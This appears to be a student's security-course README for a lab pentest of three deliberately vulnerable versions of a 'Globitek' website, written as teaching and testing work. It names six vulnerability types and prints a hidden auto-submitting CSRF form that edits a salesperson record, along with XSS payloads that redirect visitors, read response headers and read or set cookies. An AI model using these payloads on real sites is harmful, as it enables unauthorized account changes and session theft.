# Project 8 - Pentesting Live Targets

Time spent: 8 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection. Reason: Developer forgot to properly sanitize salesperson.php query.

<img src='Blue1.gif' title='SQLI'/>

Vulnerability #2: Session Hijacking/Fixation. Reason: Website does not check if user-agent is the same as the one used when first user login, cookie set without HttpOnly and secure flag, and PHPSESSID is not regenerated and is allowed to be a year old.

<img src='Blue2.gif' title='Session Hijacking/Fixation'/>


## Green

Vulnerability #1: Username Enumeration. Reason: Developer forgot to keep span tag class the same when username is or is not found, leading to vulnerability. 

<img src='Green1.gif' title='Username Enumeration'/>

Vulnerability #2: Cross-Site Scripting. Reason: Detected that Stored XS Script was run in admin feedback panel.

<img src='Green2.gif' title='Cross-Site Scripting'/>


## Red

Vulnerability #1: Insecure Direct Object Reference. Reason: Developer forgot to check if object reference request is made public or not. Other two websites properly redirected user to public/territories folder.

<img src='Red1.gif' title='IDOR'/>

Vulnerability #2: Cross-Site Request Forgery. Reason: Developer forgot to check for CSRF token on salesperson edit form submit, check for domain name, and disallow loading responses onto iframes. 

<img src='Red2.gif' title='Cross-Site Request Forgery'/>

Script used:

```
<!DOCTYPE html>
<html>

<head>
  <title>Real Form</title>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
</head>

<body onload="document.getElementById('f').submit();">
  <form action="https://104.197.73.39/red/public/staff/salespeople/edit.php?id=5" method="post" id="f" style="display: none;" target="hidden_results">
    <input name="first_name" value="Malcom" type="text">
    <input name="last_name" value="XX" type="text">
    <input name="phone" value="555-101-1080" type="text">
    <input name="email" value="bthepwr@salesperson.com" type="text">
  </form>
  <iframe name="hidden_results" style="display: none;"></iframe>
</body>

</html>
```

# Bonus Objective 2

- It is possible to redirect a user to another website by entering the following code in the feedback textbox Green's contact form `<script>window.location.href = "http://example.com";</script>` then submitting.
- The cookie single cookie, PHPSESSID, used throughout the website, it is set using HttpOnly, which prevents it from being accessed in javascript on modern web browsers, but older browsers (Firefox < 3, IE < 6 SP1) might be still be vulnerable, viewable by using XSS `<script>alert(document.cookie);</script>` or `<script>var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      alert(this.getAllResponseHeaders());
    }
  };
  xmlhttp.open("GET", “/“, true);
  xmlhttp.send();</script>`.
- It is possible to set a cookie by using XSS, `<script>document.cookie="username=something";</script>`, in Green's contact form.
 
Testing Bonus Objective 2 

<img src='bonus2.gif' title='Cross-Site Scripting'/>

## Notes
NONE
